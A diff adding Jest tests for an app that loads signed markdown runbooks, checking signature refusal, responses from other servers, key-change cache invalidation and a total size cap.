+    expect(copyRefusal(copy, undefined)).toMatch(/Checking the signature/);
+    await loadLibraryMemory();
+    expect(signedOnlyPolicy(LIB)).toBe(true);
+    expect(copyRefusal(copy, { base: LIB, path: 'restart.md', state, facts: undefined, signedOnly: true })).toMatch(
+      /trust its signers first/,
+    );
+    // An unsigned copy (the user's own edit took the signature off): refused, not silently run.
+    const unsigned = { ...copy, text: RUNBOOK };
+    expect(
+      copyRefusal(unsigned, { base: LIB, path: 'restart.md', state: { kind: 'unsigned' }, facts: undefined, signedOnly: true }),
+    ).toMatch(/not signed/);
+  });
+
+  it('F: a 2xx answer that doesn’t say where it came from is refused, as one from another server', async () => {
+    expect(redirectedAway(200, LIB + 'a.md', LIB + 'a.md')).toBeUndefined();
+    expect(redirectedAway(200, 'https://evil.example/a.md', LIB + 'a.md')).toMatch(/another server \(evil\.example\)/);
+    expect(redirectedAway(200, undefined, LIB + 'a.md')).toMatch(/did not say which server/);
+    expect(redirectedAway(200, 'not a url', LIB + 'a.md')).toMatch(/did not say which server/);
+    expect(redirectedAway(404, undefined, LIB + 'a.md')).toBeUndefined();
+    const noUrl = (async () => ({
+      ok: true,
+      status: 200,
+      url: '',
+      headers: new Headers(),
+      text: async () => '["a.md"]',
+    })) as unknown as typeof fetch;
+    expect(await fetchLibrary(LIB, noUrl)).toMatchObject({ kind: 'error', message: expect.stringMatching(/did not say which server/) });
+  });
+
+  it('H: states kept across a refresh are dropped when the keys changed', async () => {
+    const k = ed25519();
+    const files: Record<string, string> = {
+      [LIB + 'index.json']: JSON.stringify(['restart.md']),
+      [LIB + 'restart.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
+      [LIB + 'allowed_signers']: linesFor('alice', k),
+    };
+    setLibraryUrl(LIB);
+    await refreshLibrary({ fetcher: server(files) });
+    trustSigners(libraryState().library!.signers!.list, LIB);
+    await refreshLibrary({ fetcher: server(files), force: true });
+    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
+    // The team narrows the key's line (namespaces=): other keys, so while the new states are
+    // computed none is shown, never the one checked with the line as it was.
+    files[LIB + 'allowed_signers'] = `alice namespaces="md-runbook" ssh-ed25519 ${k.pub.toString('base64')}`;
+    let release!: () => void;
+    const gate = new Promise<void>((resolve) => (release = resolve));
+    const seen: (string | undefined)[] = [];
+    const realDigest = globalThis.crypto.subtle.digest.bind(globalThis.crypto.subtle);
+    const spy = jest.spyOn(globalThis.crypto.subtle, 'digest').mockImplementation(async (a, d) => {
+      await gate;
+      return realDigest(a, d);
+    });
+    try {
+      const refresh = refreshLibrary({ fetcher: server(files), force: true });
+      for (let i = 0; i < 50 && !libraryState().library?.signers?.list[0]?.namespaces; i++) await new Promise((r) => setTimeout(r, 0));
+      seen.push(signatureOf(libraryState(), libraryState().library!.entries[0]!)?.kind);
+      release();
+      await refresh;
+    } finally {
+      release();
+      spy.mockRestore();
+    }
+    expect(seen).toEqual([undefined]);
+    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
+  });
+
+  it('I: past the total cap, the rest of a library is not read', async () => {
+    const big = '# Big\n\n' + 'x'.repeat(1_900_000) + '\n';
+    const names = Array.from({ length: 14 }, (_, i) => `r${i}.md`);
+    const files: Record<string, string> = { [LIB + 'index.json']: JSON.stringify(names) };
+    for (const n of names) files[LIB + n] = big;
+    const got = await fetchLibrary(LIB, server(files));
+    if (got.kind !== 'ok') throw new Error(got.kind);
+    const unread = got.library.entries.filter((e) => e.text === undefined);
+    expect(unread.length).toBeGreaterThan(0);
+    expect(unread[0]!.error).toMatch(/more text than the app reads from one library/);
+    expect(got.library.entries.reduce((n, e) => n + (e.text?.length ?? 0), 0)).toBeLessThanOrEqual(MAX_LIBRARY_CHARS);
   });
 });
